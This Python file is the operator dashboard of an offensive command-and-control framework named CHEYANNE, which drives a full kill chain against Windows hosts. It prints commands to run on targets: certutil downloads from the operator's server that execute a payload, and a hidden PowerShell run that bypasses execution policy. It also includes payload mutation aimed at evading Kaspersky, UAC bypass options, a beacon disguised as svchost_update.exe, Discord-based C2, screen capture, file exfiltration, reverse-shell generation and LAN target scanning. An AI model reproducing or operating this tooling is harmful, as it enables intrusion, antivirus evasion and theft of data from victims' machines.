"""
CHEYANNE C2 — Terminal Dashboard v2
22DIV / george wu

Full kill chain: Drop Recon → Import → Auto-Build → Deploy → Watch
"""
import os
import sys
import glob
import json
import socket
import subprocess
import threading
import time
import re

if sys.platform == "win32":
    os.system("")
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

ROOT      = os.path.dirname(os.path.abspath(__file__))
SHELL_DIR = os.path.join(ROOT, "shell")
RECON_DIR = os.path.join(ROOT, "recon")
GHOST_DIR = os.path.join(ROOT, "ghost-encoder")

# rainfantry.github.io true-color palette
GREEN  = "\033[38;2;0;255;65m"
GREEN2 = "\033[38;2;0;204;51m"
GREEN3 = "\033[38;2;0;153;34m"
AMBER  = "\033[38;2;255;176;0m"
RED    = "\033[38;2;255;68;68m"
BLUE   = "\033[38;2;68;136;255m"
PINK   = "\033[38;2;255;45;138m"
CYAN   = "\033[38;2;0;229;255m"
DIM    = "\033[38;2;85;85;85m"
MUTED  = "\033[38;2;136;136;136m"
TEXT   = "\033[38;2;204;204;204m"
WHITE  = "\033[38;2;255;255;255m"
BOLD   = "\033[1m"
RST    = "\033[0m"
BLINK  = "\033[5m"

LOGO = f"""
{GREEN}{BOLD}
  ██████╗██╗  ██╗███████╗██╗   ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗
 ██╔════╝██║  ██║██╔════╝╚██╗ ██╔╝██╔══██╗████╗  ██║████╗  ██║██╔════╝
 ██║     ███████║█████╗   ╚████╔╝ ███████║██╔██╗ ██║██╔██╗ ██║█████╗
 ██║     ██╔══██║██╔══╝    ╚██╔╝  ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝
 ╚██████╗██║  ██║███████╗   ██║   ██║  ██║██║ ╚████║██║ ╚████║███████╗
  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝{RST}"""

BLADE = f"""{DIM}
             ·  ·  ·
          .  /\\  /\\  .
            /  \\/  \\
           |  {RED}⬡⬡⬡{DIM}  |
           |  {RED}⬡⬡⬡{DIM}  |
            \\  {AMBER}╔═╗{DIM}  /
             \\ {AMBER}║▓║{DIM} /
              \\{AMBER}╚═╝{DIM}/
               {GREEN}|||{DIM}
               {GREEN}|||{RST}"""

try:
    from cheyanne_ops import (op_sessions, op_screenshot, op_browse,
                               op_exfil, op_upload, op_recon)
    HAS_OPS = True
except ImportError:
    HAS_OPS = False


# ── helpers ───────────────────────────────────────────────────────────────────

def _strip(s):
    return re.sub(r'\033\[[0-9;]*m', '', s)


def hline(char="─", width=66, color=DIM):
    return f"  {color}{char * width}{RST}"


def _exists(rel):
    return os.path.exists(os.path.join(ROOT, rel))


def _dot(rel, color=GREEN):
    return f"{color if _exists(rel) else RED}{'●' if _exists(rel) else '○'}{RST}"


def detect_lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "192.168.1.92"


def get_defender_version():
    for p in sorted(glob.glob(r"C:\ProgramData\Microsoft\Windows Defender\Platform\*"), reverse=True):
        return os.path.basename(p)
    return "unknown"


def last_recon_summary():
    last = os.path.join(RECON_DIR, "last_imported.json")
    if not os.path.exists(last):
        return f"{DIM}none{RST}"
    try:
        with open(last) as f:
            r = json.load(f)
        h = r.get("hostname", "?")
        u = r.get("username", "?")
        adm = f"{GREEN}ADMIN{RST}" if r.get("is_admin") else f"{AMBER}USER{RST}"
        kav = f"{RED}KAV{RST}" if r.get("has_kaspersky") else f"{DIM}no-kav{RST}"
        rec = r.get("payload_recommendations", {})
        privesc = rec.get("best_privesc", "none")
        return f"{WHITE}{h}\\{u}{RST} {adm} {kav} priv={CYAN}{privesc}{RST}"
    except Exception:
        return f"{RED}parse error{RST}"


def ghost_fud_status():
    fud = os.path.join(SHELL_DIR, "ghost_fud.exe")
    if not os.path.exists(fud):
        return f"{RED}NOT BUILT{RST}"
    sz = os.path.getsize(fud)
    mtime = os.path.getmtime(fud)
    age_m = int((time.time() - mtime) / 60)
    age_str = f"{age_m}m ago" if age_m < 60 else f"{age_m//60}h ago"
    return f"{GREEN}READY{RST}  {DIM}{sz//1024}KB  {age_str}{RST}"


def beacon_status():
    b = os.path.join(ROOT, "agent", "dist", "svchost_update.exe")
    if not os.path.exists(b):
        return f"{RED}MISSING{RST}"
    sz = os.path.getsize(b)
    return f"{GREEN}BUILT{RST}  {DIM}{sz//1024}KB{RST}"


# ── render ────────────────────────────────────────────────────────────────────

def render():
    os.system("cls" if sys.platform == "win32" else "clear")
    my_ip = detect_lan_ip()

    print(LOGO)
    print(f"  {DIM}{'─' * 66}{RST}")
    print(f"  {MUTED}22DIV{DIM} // {TEXT}george wu{DIM} // {GREEN2}rainfantry.github.io{DIM}  //  {AMBER}OPERATOR: VADER{RST}")
    print(f"  {DIM}Offensive Security Research Platform  //  own hardware only{RST}")
    print(f"  {DIM}{'─' * 66}{RST}")

    # side-by-side: blade + status panel
    blade_lines = BLADE.strip().split("\n")
    status = [
        f"{AMBER}CALLSIGN{DIM}:{RST}   CHEYANNE v2",
        f"{AMBER}OPERATOR{DIM}:{RST}   VADER",
        f"{AMBER}MY IP{DIM}:{RST}      {WHITE}{my_ip}{RST}",
        f"{AMBER}DEFENDER{DIM}:{RST}   {MUTED}{get_defender_version()}{RST}",
        f"{AMBER}RECON{DIM}:{RST}      {last_recon_summary()}",
        f"{AMBER}PAYLOAD{DIM}:{RST}    {ghost_fud_status()}",
        f"{AMBER}BEACON{DIM}:{RST}     {beacon_status()}",
        f"{AMBER}MSRC{DIM}:{RST}       VULN-195458",
        "",
        f"  {DIM}\"The hunt never ends.\"{RST}",
    ]
    print()
    for i in range(max(len(blade_lines), len(status))):
        left  = blade_lines[i] if i < len(blade_lines) else ""
        right = status[i] if i < len(status) else ""
        vis   = _strip(left)
        pad   = 26 - len(vis)
        print(f"  {left}{' ' * max(pad, 1)}{right}")

    # ── KILL CHAIN WORKFLOW ──────────────────────────────────────────────────
    print()
    print(hline("═"))
    print(f"  {GREEN}{BOLD}  KILL CHAIN  {DIM}—  Drop Recon → Import → Build → Deploy → Watch{RST}")
    print(hline("─"))
    print()
    # visual flow bar
    steps = [
        ("Q", "DROP RECON", _exists("recon/recon_drop.ps1")),
        ("I", "IMPORT",     _exists("recon/last_imported.json")),
        ("B", "AUTO BUILD", _exists("shell/ghost_fud.exe")),
        ("P", "PHASE 0",    True),
        ("W", "WATCH/VNC",  _exists("watch_stream.py")),
    ]
    flow = "  "
    for key, name, ready in steps:
        col = GREEN if ready else AMBER
        flow += f"{col}[{key}] {name}{RST} {DIM}→{RST} "
    flow = flow.rstrip(f" {DIM}→{RST} ")
    print(flow)
    print()

    CHAIN = [
        ("Q", "Drop Recon",     "Run recon_drop.ps1 on target → JSON",        CYAN),
        ("I", "Import Recon",   "Load recon JSON → auto-select payload config", CYAN),
        ("B", "Build Payload",  "Auto-build tailored ghost_fud + privesc PS1", GREEN),
        ("V", "Privesc",        "UAC bypass (fodhelper/eventvwr/sdclt/auto)",   AMBER),
        ("P", "Phase 0",        "KAV pause + file server + C2 listener",        RED),
        ("W", "Watch / VNC",    "Live screenshot stream → browser :8892",       PINK),
        ("T", "Test Chain",     "Full automated local kill chain test (8/8)",   GREEN2),
        ("K", "Scan LAN",       "ARP/TCP scan → find Radon + Verena",           BLUE),
    ]
    for key, name, desc, color in CHAIN:
        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")

    # ── BUILD ────────────────────────────────────────────────────────────────
    print()
    print(hline("═"))
    print(f"  {PINK}{BOLD}  BUILD{RST}")
    print(hline("─"))
    BUILD = [
        ("F",  "Fresh Build",    "Mutate + auto-IP + compile + scan",           PINK),
        ("X",  "FUD Build",      "Metamorph + mutate — breaks signatures",      RED),
        ("Z",  "FUD Auto Loop",  "Loop until Kaspersky CLEAN (ghost mode)",     RED),
        ("G",  "Ghost Encode",   "Steg payload + ghost_loader EXE",             CYAN),
        ("1",  "Compile Only",   "Build without mutation",                      AMBER),
        ("2",  "Scan All",       "Kaspersky + Defender — all binaries",         RED),
    ]
    for key, name, desc, color in BUILD:
        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")

    # ── DEPLOY ───────────────────────────────────────────────────────────────
    print()
    print(hline("═"))
    print(f"  {RED}{BOLD}  DEPLOY{RST}")
    print(hline("─"))
    DEPLOY = [
        ("D",  "C2 Shell",       "TCP + Discord dual-channel C2",               GREEN),
        ("A",  "Auto Op",        "Full automated Discord → TCP kill chain",      RED),
        ("R",  "TCP Reconnect",  "Re-deliver via Discord beacon (KAV-safe)",     AMBER),
        ("H",  "VADER Terminal", "AI operator — chat + tools",                  PINK),
    ]
    for key, name, desc, color in DEPLOY:
        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")

    # ── OPERATE ──────────────────────────────────────────────────────────────
    print()
    print(hline("═"))
    ops_col = CYAN if HAS_OPS else DIM
    print(f"  {CYAN}{BOLD}  OPERATE{RST}  {DIM}(Discord beacon commands){RST}")
    print(hline("─"))
    OPERATE = [
        ("S",  "Sessions",       "List active targets + session IDs",           ops_col),
        ("N",  "Recon",          "Full target enumeration via beacon",           ops_col),
        ("SC", "Screenshot",     "Capture target screen via beacon",            ops_col),
        ("E",  "Exfil",          "Pull file from target → local loot/",         ops_col),
        ("U",  "Upload",         "Push file to target",                         ops_col),
    ]
    for key, name, desc, color in OPERATE:
        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")
    if not HAS_OPS:
        print(f"  {RED}    [!] cheyanne_ops.py missing — beacon commands disabled{RST}")

    # ── STATUS BAR ───────────────────────────────────────────────────────────
    print()
    print(hline())
    ghost_ok  = _exists("shell/ghost_fud.exe")
    beacon_ok = _exists("agent/dist/svchost_update.exe")
    recon_ok  = _exists("recon/last_imported.json")
    watch_ok  = _exists("watch_stream.py")
    items = [
        ("PAYLOAD", ghost_ok),
        ("BEACON",  beacon_ok),
        ("RECON",   recon_ok),
        ("WATCH",   watch_ok),
        ("OPS",     HAS_OPS),
    ]
    status_parts = []
    for label, ok in items:
        col = GREEN if ok else DIM
        status_parts.append(f"{col}{label}{RST}")
    print(f"  {DIM}  {'  │  '.join(status_parts)}{RST}")
    print(hline())
    print(f"  {DIM}  [0] exit  {MUTED}│{DIM}  My IP: {WHITE}{my_ip}{DIM}  │  C2 :4443  │  Files :8890{RST}")
    print()


# ── action handlers ───────────────────────────────────────────────────────────

def prompt_ip(default=None):
    if not default:
        default = detect_lan_ip()
    print(f"  {DIM}  LAN: use {default} (auto-detected) | WAN: use ngrok host | enter to accept{RST}")
    val = input(f"  {AMBER}C2 IP [{TEXT}{default}{AMBER}]:{RST} ").strip()
    return val or default


def prompt_port(default="4443"):
    val = input(f"  {AMBER}C2 PORT [{TEXT}{default}{AMBER}]:{RST} ").strip()
    return val or default


def _phase0_launch():
    import functools
    from http.server import HTTPServer, SimpleHTTPRequestHandler

    print(f"\n  {RED}{BOLD}╔══ PHASE 0 — PRE-OP ══╗{RST}")
    print(f"  {AMBER}  Pause Kaspersky real-time if needed (tray → pause protection){RST}")
    input(f"\n  {WHITE}  Press Enter when ready...{RST}")

    my_ip = detect_lan_ip()
    try:
        handler = functools.partial(SimpleHTTPRequestHandler, directory=ROOT)
        handler.log_message = lambda *a: None
        srv = HTTPServer(("0.0.0.0", 8890), handler)
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        print(f"\n  {GREEN}[OK]{RST} File server: http://{my_ip}:8890/")
    except OSError:
        print(f"  {AMBER}[!]{RST}  Port 8890 busy — file server already running")

    print(f"  {GREEN}[OK]{RST} C2 listener: 0.0.0.0:4443")
    print()
    print(f"  {RED}{BOLD}  ┌─ PASTE ON TARGET (CMD) ──────────────────────────────────────────┐{RST}")
    fud = "ghost_fud.exe" if _exists("shell/ghost_fud.exe") else "ghost_loader.exe"
    print(f"  {WHITE}  certutil -urlcache -split -f "
          f"\"http://{my_ip}:8890/shell/{fud}\" "
          f"\"C:\\Users\\Public\\ghost.exe\" & "
          f"start /B \"\" \"C:\\Users\\Public\\ghost.exe\"{RST}")
    print(f"  {RED}{BOLD}  └────────────────────────────────────────────────────────────────────┘{RST}")
    print()

    c2 = os.path.join(SHELL_DIR, "vader_c2_v2.py")
    subprocess.Popen([sys.executable, c2], cwd=ROOT,
                     creationflags=subprocess.CREATE_NEW_CONSOLE)
    print(f"  {GREEN}[OK]{RST} C2 launched in new window")
    input(f"\n  {DIM}  Press Enter to return...{RST}")


def _drop_recon():
    """Drop recon script path + show how to run it on target."""
    ps1 = os.path.join(RECON_DIR, "recon_drop.ps1")
    my_ip = detect_lan_ip()
    print(f"\n  {CYAN}{BOLD}╔══ DROP RECON ══╗{RST}")
    print(f"  {DIM}  Delivers recon_drop.ps1 — outputs JSON to %TEMP%\\chey_recon.json on target{RST}")
    print()
    print(f"  {WHITE}Run on TARGET via existing beacon CMD:{RST}")
    print(f"  {AMBER}  certutil -urlcache -split -f "
          f"\"http://{my_ip}:8890/recon/recon_drop.ps1\" "
          f"\"%TEMP%\\rd.ps1\" & "
          f"powershell -NoP -ep bypass -W Hidden -File \"%TEMP%\\rd.ps1\"{RST}")
    print()
    print(f"  {WHITE}Or run locally (on THIS machine) for test:{RST}")
    run_local = input(f"  {DIM}  Run recon on this machine now? [y/N]: {RST}").strip().lower()
    if run_local == "y":
        env = {**os.environ, "PYTHONIOENCODING": "utf-8"}
        r = subprocess.run(
            ["powershell", "-NoP", "-ep", "bypass", "-W", "Hidden", "-File", ps1],
            capture_output=True, text=True, encoding="utf-8", errors="replace"
        )
        print(r.stdout or r.stderr or "[no output]")
        json_path = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "chey_recon.json")
        if os.path.exists(json_path):
            print(f"  {GREEN}[+] Recon JSON at: {json_path}{RST}")
            import_path = input(f"  {AMBER}Import now? [Y/n]: {RST}").strip().lower()
            if import_path != "n":
                _import_recon(src=json_path)
    input(f"\n  {DIM}  Press Enter to return...{RST}")


def _import_recon(src=None):
    """Import a recon JSON file → save as recon/last_imported.json."""
    if not src:
        print(f"\n  {CYAN}{BOLD}╔══ IMPORT RECON ══╗{RST}")
        print(f"  {DIM}  Paste path to chey_recon.json from target (e.g. \\\\radon\\C$\\Users\\...){RST}")
        print(f"  {DIM}  Or press Enter to scan for recent recon files...{RST}")
        src = input(f"  {AMBER}Path: {RST}").strip().strip('"')

    if not src:
        # find recent recon JSON files
        candidates = glob.glob(r"C:\Users\*\AppData\Local\Temp\chey_recon.json")
        candidates += glob.glob(os.path.join(RECON_DIR, "*.json"))
        if candidates:
            print(f"\n  {WHITE}Found recon files:{RST}")
            for i, c in enumerate(candidates):
                print(f"  {DIM}  [{i+1}] {c}{RST}")
            choice = input(f"  {AMBER}Select [1-{len(candidates)}]: {RST}").strip()
            try:
                src = candidates[int(choice) - 1]
            except Exception:
                print(f"  {RED}Invalid selection{RST}")
                return
        else:
            print(f"  {RED}[!] No recon files found{RST}")
            return

    if not os.path.exists(src):
        print(f"  {RED}[!] File not found: {src}{RST}")
        return

    import shutil
    dst = os.path.join(RECON_DIR, "last_imported.json")
    shutil.copy2(src, dst)

    try:
        with open(dst) as f:
            r = json.load(f)
        rec = r.get("payload_recommendations", {})
        print(f"\n  {GREEN}[+] Recon imported: {r.get('hostname','?')}\\{r.get('username','?')}{RST}")
        print(f"  {DIM}    Admin:    {'YES' if r.get('is_admin') else 'no'}{RST}")
        print(f"  {DIM}    KAV:      {'YES — FUD required' if r.get('has_kaspersky') else 'no'}{RST}")
        print(f"  {DIM}    Defender: {'ACTIVE' if r.get('defender_realtime') else 'off/absent'}{RST}")
        print(f"  {DIM}    FUD level: {rec.get('fud_level','?')}{RST}")
        print(f"  {DIM}    Privesc:  {rec.get('best_privesc','none')}{RST}")
        print(f"  {DIM}    Arch:     {rec.get('arch','?')}{RST}")
    except Exception as e:
        print(f"  {AMBER}[!] JSON parse warning: {e}{RST}")


def _build_payload():
    """Auto-build tailored payload from imported recon JSON."""
    last = os.path.join(RECON_DIR, "last_imported.json")
    if not os.path.exists(last):
        print(f"\n  {AMBER}[!] No imported recon. Run [I] Import Recon first.{RST}")
        print(f"  {DIM}  Will build with defaults (no target optimization){RST}")
        use_recon = False
    else:
        use_recon = True

    my_ip = prompt_ip()
    port  = prompt_port()

    print(f"\n  {GREEN}{BOLD}=== AUTO PAYLOAD BUILD ==={RST}\n")
    env = {**os.environ, "PYTHONIOENCODING": "utf-8"}
    if use_recon:
        r = subprocess.run(
            [sys.executable, os.path.join(ROOT, "payload_auto.py"),
             last, my_ip, port],
            cwd=ROOT, env=env
        )
    else:
        r = subprocess.run(
            [sys.executable, os.path.join(ROOT, "build_ghost_loader.py"),
             my_ip, port, "--v3"],
            cwd=ROOT, env=env
        )
        if r.returncode == 0:
            subprocess.run(
                [sys.executable, os.path.join(ROOT, "fud_auto.py"),
                 "ghost", my_ip, port, "--scan-only", "--max", "5"],
                cwd=ROOT, env=env
            )


def _watch_vnc():
    """Launch VNC screenshot stream via existing TCP C2 or new connection."""
    print(f"\n  {PINK}{BOLD}╔══ WATCH / VNC ══╗{RST}")
    print(f"  {DIM}  Opens browser tab at http://127.0.0.1:8892 — live screenshot stream{RST}")
    print(f"  {DIM}  Requires active TCP shell session (ghost_loader.exe connected){RST}")
    print()
    host = input(f"  {AMBER}TCP shell host [{TEXT}127.0.0.1{AMBER}]: {RST}").strip() or "127.0.0.1"
    port = input(f"  {AMBER}TCP shell port [{TEXT}4443{AMBER}]: {RST}").strip() or "4443"
    watch = os.path.join(ROOT, "watch_stream.py")
    if not os.path.exists(watch):
        print(f"  {RED}[!] watch_stream.py not found{RST}")
        return
    print(f"\n  {GREEN}[*] Starting watch stream → http://127.0.0.1:8892{RST}")
    subprocess.Popen(
        [sys.executable, watch, host, port],
        cwd=ROOT, creationflags=subprocess.CREATE_NEW_CONSOLE
    )
    import webbrowser, time
    time.sleep(1.5)
    webbrowser.open("http://127.0.0.1:8892")


def _scan_lan():
    """Scan LAN for live hosts."""
    print(f"\n  {BLUE}{BOLD}╔══ LAN SCAN ══╗{RST}")
    print(f"  {DIM}  TCP connect scan (ports 445/135/22/80) — no nmap required{RST}")
    my_ip = detect_lan_ip()
    prefix = ".".join(my_ip.split(".")[:3])
    print(f"  {DIM}  Scanning {prefix}.1-254 ...{RST}\n")
    import concurrent.futures
    PORTS = [445, 135, 22, 80]
    def check(ip):
        for p in PORTS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((ip, p))
                s.close()
                return (ip, p)
            except Exception:
                pass
        return None
    hosts = [f"{prefix}.{i}" for i in range(1, 255)]
    live = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
        for result in ex.map(check, hosts):
            if result:
                ip, port = result
                live.append(ip)
                label = ""
                if ip == my_ip:
                    label = f" {GREEN}← ME{RST}"
                elif "145" in ip.split("."):
                    label = f" {RED}← RADON{RST}"
                elif "146" in ip.split(".") or "147" in ip.split("."):
                    label = f" {AMBER}← VERENA?{RST}"
                print(f"  {GREEN}[+]{RST} {WHITE}{ip}{RST}:{port}{label}")
    if not live:
        print(f"  {DIM}  No hosts found{RST}")
    else:
        print(f"\n  {GREEN}  {len(live)} hosts alive{RST}")
        radon_candidates = [h for h in live if h != my_ip]
        if radon_candidates:
            print(f"  {AMBER}  Targets: {', '.join(radon_candidates[:5])}{RST}")


def _run_test():
    """Full automated test chain."""
    print(f"\n  {GREEN}{BOLD}=== FULL TEST CHAIN ==={RST}\n")
    env = {**os.environ, "PYTHONIOENCODING": "utf-8"}
    subprocess.run(
        [sys.executable, os.path.join(ROOT, "test_auto_full.py")],
        cwd=ROOT, env=env
    )


def _privesc_menu():
    """Show and test UAC bypass options."""
    print(f"\n  {AMBER}{BOLD}╔══ PRIVESC / UAC BYPASS ══╗{RST}")
    last = os.path.join(RECON_DIR, "last_imported.json")
    if os.path.exists(last):
        try:
            with open(last) as f:
                r = json.load(f)
            candidates = r.get("privesc_candidates", [])
            rec = r.get("payload_recommendations", {}).get("best_privesc", "none")
            print(f"  {DIM}  Target: {r.get('hostname','?')}  Build: {r.get('os_build','?')}{RST}")
            print(f"  {DIM}  Candidates: {', '.join(candidates) if candidates else 'none'}{RST}")
            print(f"  {GREEN}  Recommended: {rec}{RST}")
        except Exception:
            pass
    print()
    METHODS = [
        ("1", "fodhelper",        "Win10+ COM UAC bypass via ms-settings key",    GREEN),
        ("2", "eventvwr",         "Win8+ via mscfile key — silent elevation",      AMBER),
        ("3", "sdclt",            "Win10 1703+ via Folder shell key",              AMBER),
        ("4", "computerdefaults", "Win10+ COM variant — very reliable",           GREEN),
    ]
    for key, name, desc, color in METHODS:
        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<22s}{RST} {DIM}{desc}{RST}")
    print(f"  {DIM}  [0]{RST}  {MUTED}Back{RST}")
    print()
    method_choice = input(f"  {AMBER}PRIVESC method: {RST}").strip()
    method_map = {"1": "fodhelper", "2": "eventvwr", "3": "sdclt", "4": "computerdefaults"}
    if method_choice not in method_map:
        return
    method = method_map[method_choice]
    ip = prompt_ip()
    port = prompt_port()
    from payload_auto import build_privesc_ps1
    out = os.path.join(SHELL_DIR, f"privesc_{method}.ps1")
    ok = build_privesc_ps1(method, ip, int(port), out)
    if ok:
        print(f"  {GREEN}[+] Written: {out}{RST}")
    else:
        print(f"  {RED}[!] Build failed{RST}")


def fresh_build(mutate, deploy, fud=False):
    mode = "FUD BUILD" if fud else "FRESH BUILD"
    print(f"\n  {PINK}{BOLD}═══ {mode} ═══{RST}\n")
    my_ip = detect_lan_ip()
    print(f"  {GREEN}[+] Operator IP: {my_ip}{RST}")
    metamorph = os.path.join(ROOT, "metamorph.py")
    if fud and os.path.exists(metamorph):
        intensity = input(f"  {AMBER}Metamorph intensity [low/med/high] (default=high): {RST}").strip() or "high"
        subprocess.run([sys.executable, metamorph, "--target", "shell",
                        "--intensity", intensity], cwd=ROOT)
    subprocess.run([sys.executable, mutate], cwd=ROOT)
    subprocess.run([sys.executable, deploy, "--compile-shell", my_ip, "4443"], cwd=ROOT)
    subprocess.run([sys.executable, deploy, "--status"], cwd=ROOT)
    print(f"\n  {GREEN}{BOLD}═══ BUILD COMPLETE ═══{RST}")


def run_op(choice):
    deploy = os.path.join(ROOT, "deploy.py")
    mutate = os.path.join(ROOT, "mutate.py")
    ch = choice.lower().strip()

    # ── WORKFLOW ──────────────────────────────────────────────────────────────
    if ch == "q":
        _drop_recon()
    elif ch == "i":
        _import_recon()
        input(f"\n  {DIM}Press Enter to return...{RST}")
    elif ch == "b":
        _build_payload()
        input(f"\n  {DIM}Press Enter to return...{RST}")
    elif ch == "v":
        _privesc_menu()
        input(f"\n  {DIM}Press Enter to return...{RST}")
    elif ch == "p":
        _phase0_launch()
    elif ch == "w":
        _watch_vnc()
        input(f"\n  {DIM}Press Enter to return...{RST}")
    elif ch == "t":
        _run_test()
        input(f"\n  {DIM}Press Enter to return...{RST}")
    elif ch == "k":
        _scan_lan()
        input(f"\n  {DIM}Press Enter to return...{RST}")

    # ── BUILD ─────────────────────────────────────────────────────────────────
    elif ch == "1":
        subprocess.run([sys.executable, deploy, "--compile"], cwd=ROOT)
        input(f"\n  {DIM}Press Enter to return...{RST}")
    elif ch == "2":
        subprocess.run([sys.executable, deploy, "--status"], cwd=ROOT)
        input(f"\n  {DIM}Press Enter to return...{RST}")
    elif ch == "f":
        fresh_build(mutate, deploy)
        input(f"\n  {DIM}Press Enter to return...{RST}")
    elif ch == "x":
        fresh_build(mutate, deploy, fud=True)
        input(f"\n  {DIM}Press Enter to return...{RST}")
    elif ch == "z":
        my_ip = detect_lan_ip()
        ip   = prompt_ip(my_ip)
        port = prompt_port()
        subprocess.run(
            [sys.executable, os.path.join(ROOT, "fud_auto.py"),
             "ghost", ip, port, "--scan-only", "--max", "15"],
            cwd=ROOT
        )
        input(f"\n  {DIM}Press Enter to return...{RST}")
    elif ch == "g":
        _run_ghost()

    # ── DEPLOY ────────────────────────────────────────────────────────────────
    elif ch == "d" or ch in ("shell", "c2"):
        c2 = os.path.join(SHELL_DIR, "vader_c2_v2.py")
        subprocess.run([sys.executable, c2], cwd=ROOT)
    elif ch == "a":
        subprocess.run(
            [sys.executable, os.path.join(ROOT, "auto_op.py"), "--skip-build"],
            cwd=ROOT
        )
        input(f"\n  {DIM}Press Enter to return...{RST}")
    elif ch == "r":
        _tcp_reconnect_via_discord()
    elif ch == "h":
        vader_root = r"C:\Users\gwu07\22DIV"
        vader_py = os.path.join(vader_root, ".venv", "Scripts", "python.exe")
        if not os.path.exists(vader_py):
            vader_py = sys.executable
        env = {**os.environ, "PYTHONPATH": vader_root}
        subprocess.run([vader_py, "-m", "vader.terminal"], cwd=vader_root, env=env)

    # ── OPERATE ───────────────────────────────────────────────────────────────
    elif ch == "s" and HAS_OPS:     op_sessions()
    elif ch == "n" and HAS_OPS:     op_recon()
    elif ch == "sc" and HAS_OPS:    op_screenshot()
    elif ch == "e" and HAS_OPS:     op_exfil()
    elif ch == "u" and HAS_OPS:     op_upload()
    elif ch in ("s","n","sc","e","u") and not HAS_OPS:
        print(f"\n  {RED}[!] cheyanne_ops.py not loaded{RST}")
        input(f"\n  {DIM}Press Enter...{RST}")
    else:
        print(f"\n  {RED}[!] Unknown: {choice!r}   Type 0 to exit{RST}")
        input(f"  {DIM}Press Enter...{RST}")
    return True


# ── reuse from old menu (kept intact) ─────────────────────────────────────────

def _run_ghost():
    ghost_script = os.path.join(GHOST_DIR, "ghost_encode.py")
    if not os.path.exists(ghost_script):
        print(f"\n  {RED}[!] Ghost encoder not found{RST}")
        input(f"  {DIM}Press Enter...{RST}")
        return
    print(f"\n  {CYAN}{'═'*62}{RST}")
    print(f"  {CYAN}{BOLD}  GHOST ENCODER{RST}")
    print(f"  {DIM}  [1] Reverse Shell  [2] VADER Chain  [6] Ghost Loader EXE  [0] Back{RST}")
    print()
    choice = input(f"  {CYAN}GHOST >{RST} ").strip()
    env = {**os.environ, "PYTHONIOENCODING": "utf-8"}
    if choice == "1":
        ip = prompt_ip(); port = prompt_port()
        out = os.path.join(ROOT, "ghost_shell.ps1")
        subprocess.run([sys.executable, ghost_script, "--shell", ip, port,
                        "--invisible", "-o", out], cwd=GHOST_DIR, env=env)
        if os.path.exists(out):
            print(f"  {GREEN}[+] {out}{RST}")
    elif choice == "6":
        ip = prompt_ip(); port = prompt_port()
        ver = input(f"  {AMBER}Version [2/3] (default: 3): {RST}").strip()
        cmd = [sys.executable, os.path.join(ROOT, "build_ghost_loader.py"), ip, port]
        if ver != "2": cmd.append("--v3")
        subprocess.run(cmd, cwd=ROOT)
    input(f"\n  {DIM}Press Enter to return...{RST}")


def _tcp_reconnect_via_discord():
    import functools
    from http.server import HTTPServer, SimpleHTTPRequestHandler
    import urllib.request

    print(f"\n  {AMBER}{BOLD}=== TCP RECONNECT VIA DISCORD ==={RST}")
    ghost_exe = os.path.join(SHELL_DIR, "ghost_loader.exe")
    if not os.path.exists(ghost_exe):
        print(f"  {RED}[!] ghost_loader.exe not found — run [B] Build first{RST}")
        input(f"\n  {DIM}Press Enter...{RST}")
        return
    my_ip = detect_lan_ip()
    try:
        handler = functools.partial(SimpleHTTPRequestHandler, directory=ROOT)
        handler.log_message = lambda *a: None
        srv = HTTPServer(("0.0.0.0", 8890), handler)
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        print(f"  {GREEN}[*] File server: http://{my_ip}:8890/shell/ghost_loader.exe{RST}")
    except OSError:
        print(f"  {AMBER}[!] Port 8890 already bound{RST}")
    c2 = os.path.join(SHELL_DIR, "vader_c2_v2.py")
    launch = input(f"  {GREEN}Launch C2 now? [Y/n]: {RST}").strip().lower()
    if launch != "n":
        subprocess.run([sys.executable, c2], cwd=ROOT)


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    while True:
        try:
            render()
            choice = input(f"  {GREEN}CHEYANNE >{RST} ").strip()
            ch = choice.strip("﻿").lower()
            if ch in ("0", "q", "quit", "exit"):
                print(f"\n  {DIM}The hunt never ends.{RST}\n")
                break
            if ch:
                run_op(choice.strip("﻿"))
        except KeyboardInterrupt:
            print(f"\n  {DIM}[*] Ctrl+C — back to menu{RST}")
            continue


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n  {DIM}The hunt never ends.{RST}\n")
